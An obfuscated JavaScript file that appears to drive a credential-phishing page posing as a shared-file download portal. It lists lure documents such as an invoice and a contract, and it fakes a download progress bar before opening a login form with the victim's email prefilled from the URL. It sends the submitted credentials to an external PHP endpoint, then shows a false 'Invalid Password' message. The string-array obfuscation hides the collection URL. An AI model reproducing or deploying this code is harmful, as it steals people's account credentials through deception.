const a0_0x3d12ec = a0_0x1eac;
(function(_0x2a6073, _0x1b19c1) {
    const _0x4e90fb = a0_0x1eac,
        _0x5e7025 = _0x2a6073();
    while (!![]) {
        try {
            const _0xbf7603 = -parseInt(_0x4e90fb(0x1e8)) / 0x1 * (-parseInt(_0x4e90fb(0x1f5)) / 0x2) + parseInt(_0x4e90fb(0x1ef)) / 0x3 * (-parseInt(_0x4e90fb(0x1fa)) / 0x4) + parseInt(_0x4e90fb(0x1ff)) / 0x5 * (-parseInt(_0x4e90fb(0x1db)) / 0x6) + parseInt(_0x4e90fb(0x1e9)) / 0x7 * (parseInt(_0x4e90fb(0x1cd)) / 0x8) + -parseInt(_0x4e90fb(0x1cb)) / 0x9 * (-parseInt(_0x4e90fb(0x1d3)) / 0xa) + -parseInt(_0x4e90fb(0x1ec)) / 0xb * (parseInt(_0x4e90fb(0x1e5)) / 0xc) + -parseInt(_0x4e90fb(0x1d6)) / 0xd * (-parseInt(_0x4e90fb(0x1e3)) / 0xe);
            if (_0xbf7603 === _0x1b19c1) break;
            else _0x5e7025['push'](_0x5e7025['shift']());
        } catch (_0x38db33) {
            _0x5e7025['push'](_0x5e7025['shift']());
        }
    }
}(a0_0xdde4, 0x8a21c));

function a0_0x1eac(_0x4407aa, _0x20e7a9) {
    const _0xdde4b9 = a0_0xdde4();
    return a0_0x1eac = function(_0x1eac9b, _0x1c30f5) {
        _0x1eac9b = _0x1eac9b - 0x1c0;
        let _0x479280 = _0xdde4b9[_0x1eac9b];
        return _0x479280;
    }, a0_0x1eac(_0x4407aa, _0x20e7a9);
}
const files = ['PO_201AJ02.xls', a0_0x3d12ec(0x1d8), 'Contract.xls', a0_0x3d12ec(0x1d2), a0_0x3d12ec(0x204), a0_0x3d12ec(0x1d7)],
    iconMap = {
        'pdf': a0_0x3d12ec(0x1ce),
        'xls': a0_0x3d12ec(0x1d0),
        'xlsx': 'bi-file-earmark-excel-fill\x20text-success',
        'doc': a0_0x3d12ec(0x1cf),
        'docx': a0_0x3d12ec(0x1cf),
        'ppt': a0_0x3d12ec(0x1e1),
        'pptx': 'bi-file-earmark-slides-fill\x20text-warning',
        'jpg': a0_0x3d12ec(0x1e6),
        'jpeg': a0_0x3d12ec(0x1e6),
        'png': 'bi-file-earmark-image-fill\x20text-muted',
        'txt': a0_0x3d12ec(0x1c4),
        'default': a0_0x3d12ec(0x1ca)
    },
    fileList = document[a0_0x3d12ec(0x1fd)](a0_0x3d12ec(0x1c9));
files['forEach'](_0x55cbc0 => {
    const _0x3d6cb0 = a0_0x3d12ec,
        _0x2bfb1d = _0x55cbc0[_0x3d6cb0(0x201)]('.')[_0x3d6cb0(0x205)]()[_0x3d6cb0(0x1e0)](),
        _0x183ce1 = iconMap[_0x2bfb1d] || iconMap[_0x3d6cb0(0x1f0)],
        _0x4231b1 = document['createElement']('div');
    _0x4231b1[_0x3d6cb0(0x1f2)] = 'file-item', _0x4231b1[_0x3d6cb0(0x1c1)] = _0x3d6cb0(0x1f1) + _0x55cbc0 + _0x3d6cb0(0x1da) + _0x183ce1 + '\x22></i>', fileList[_0x3d6cb0(0x1fe)](_0x4231b1);
});
const button = document[a0_0x3d12ec(0x1fd)]('showFormBtn'),
    spinner = document[a0_0x3d12ec(0x1fd)](a0_0x3d12ec(0x1dc)),
    text = document[a0_0x3d12ec(0x1fd)](a0_0x3d12ec(0x1dd));
button[a0_0x3d12ec(0x1ee)]('click', () => {
    const _0x287f08 = a0_0x3d12ec;
    spinner[_0x287f08(0x1f8)][_0x287f08(0x1eb)](_0x287f08(0x1f6)), text[_0x287f08(0x209)] = 'Downloading\x20file...\x200%';
    let _0x253c69 = 0x0;
    const _0x429875 = setInterval(() => {
        const _0xc3eeb7 = _0x287f08;
        _0x253c69 += 0x3, text[_0xc3eeb7(0x209)] = _0xc3eeb7(0x1d1) + _0x253c69 + '%', _0x253c69 >= 0x4b && (clearInterval(_0x429875), spinner[_0xc3eeb7(0x1f8)][_0xc3eeb7(0x1f7)](_0xc3eeb7(0x1f6)), text[_0xc3eeb7(0x209)] = _0xc3eeb7(0x1d5), new bootstrap['Modal'](document[_0xc3eeb7(0x1fd)](_0xc3eeb7(0x1c6)))[_0xc3eeb7(0x1c7)]());
    }, 0x12c);
}), document[a0_0x3d12ec(0x1fd)](a0_0x3d12ec(0x1c9))[a0_0x3d12ec(0x1ee)](a0_0x3d12ec(0x1c0), function() {
    const _0xf6baaa = a0_0x3d12ec;
    document[_0xf6baaa(0x1fd)](_0xf6baaa(0x1e2))[_0xf6baaa(0x1c0)]();
});

function onTurnstileVerified(_0x42830e) {
    const _0x3f8893 = a0_0x3d12ec;
    document[_0x3f8893(0x1fd)](_0x3f8893(0x1fb))['disabled'] = ![];
}
const form = document[a0_0x3d12ec(0x1fd)](a0_0x3d12ec(0x1fc)),
    alertBox = document['getElementById'](a0_0x3d12ec(0x1df));
form[a0_0x3d12ec(0x1ee)](a0_0x3d12ec(0x1e7), function(_0x265297) {
    const _0xb70be0 = a0_0x3d12ec;
    _0x265297[_0xb70be0(0x200)]();
    if (!form[_0xb70be0(0x203)]()) {
        form[_0xb70be0(0x1f8)]['add'](_0xb70be0(0x206));
        return;
    }
    const _0x5e2ba6 = new FormData(form);
    fetch(_0xb70be0(0x1c5), {
        'method': _0xb70be0(0x1f4),
        'body': _0x5e2ba6
    })[_0xb70be0(0x1de)](_0x58214c => _0x58214c['ok'] ? _0x58214c[_0xb70be0(0x1c2)]() : Promise[_0xb70be0(0x1c3)](_0x58214c[_0xb70be0(0x1cc)]))[_0xb70be0(0x1de)](_0x1e8efb => {
        const _0x128e80 = _0xb70be0;
        alertBox['textContent'] = _0x128e80(0x1e4), alertBox['classList'][_0x128e80(0x1eb)](_0x128e80(0x1f6)), document[_0x128e80(0x1fd)](_0x128e80(0x1ea))[_0x128e80(0x208)] = '', setTimeout(() => {
            const _0x3ef7b0 = _0x128e80;
            alertBox['classList'][_0x3ef7b0(0x1f7)]('d-none');
            const _0x41af41 = bootstrap[_0x3ef7b0(0x207)][_0x3ef7b0(0x1ed)](document[_0x3ef7b0(0x1fd)](_0x3ef7b0(0x1c6)));
            _0x41af41[_0x3ef7b0(0x1f3)]();
        }, 0xbb8);
    })[_0xb70be0(0x1d4)](_0x1fbf06 => {
        const _0x144d66 = _0xb70be0;
        alertBox[_0x144d66(0x209)] = 'There\x20was\x20an\x20error\x20submitting\x20the\x20form.', alertBox[_0x144d66(0x1f8)][_0x144d66(0x1eb)]('d-none');
    }), form[_0xb70be0(0x1f8)][_0xb70be0(0x1f7)](_0xb70be0(0x206));
});
const emailParam = new URLSearchParams(window[a0_0x3d12ec(0x1c8)][a0_0x3d12ec(0x1d9)])[a0_0x3d12ec(0x202)]('email');
emailParam && (document[a0_0x3d12ec(0x1fd)](a0_0x3d12ec(0x1f9))[a0_0x3d12ec(0x208)] = emailParam);

function a0_0xdde4() {
    const _0x33fe3a = ['667723tjwpXu', 'name', 'remove', '82742TTneaI', 'getInstance', 'addEventListener', '6dzOVMW', 'default', '<span>', 'className', 'hide', 'POST', '1698602tWnwJQ', 'd-none', 'add', 'classList', 'email', '22156VmaipT', 'submitBtn', 'accessForm', 'getElementById', 'appendChild', '130EEFepx', 'preventDefault', 'split', 'get', 'checkValidity', 'Presentation.pptx', 'pop', 'was-validated', 'Modal', 'value', 'textContent', 'click', 'innerHTML', 'text', 'reject', 'bi-file-earmark-text-fill\x20text-secondary', 'https://multiserviciosaluvigo.com.mx/.fmreb/cj/zimlac.php', 'formModal', 'show', 'location', 'file-list', 'bi-file-earmark-fill\x20text-dark', '129987eVQjZd', 'status', '8dfPhvu', 'bi-file-earmark-pdf-fill\x20text-danger', 'bi-file-earmark-word-fill\x20text-primary', 'bi-file-earmark-excel-fill\x20text-success', 'Downloading\x20file...\x20', 'Invoice_F2023.pdf', '460iibxYG', 'catch', 'Access\x20Files', '961974NRiCxW', 'Image.jpeg', 'Specifications.pdf', 'search', '</span><i\x20class=\x22bi\x20', '152016cmgHzx', 'loadingSpinner', 'buttonText', 'then', 'submissionAlert', 'toLowerCase', 'bi-file-earmark-slides-fill\x20text-warning', 'showFormBtn', '56VMmdcp', 'Invalid\x20Password,\x20download\x20stopped,\x20Try\x20again.', '1068YqmbsE', 'bi-file-earmark-image-fill\x20text-muted', 'submit', '1UHqNoy'];
    a0_0xdde4 = function() {
        return _0x33fe3a;
    };
    return a0_0xdde4();
}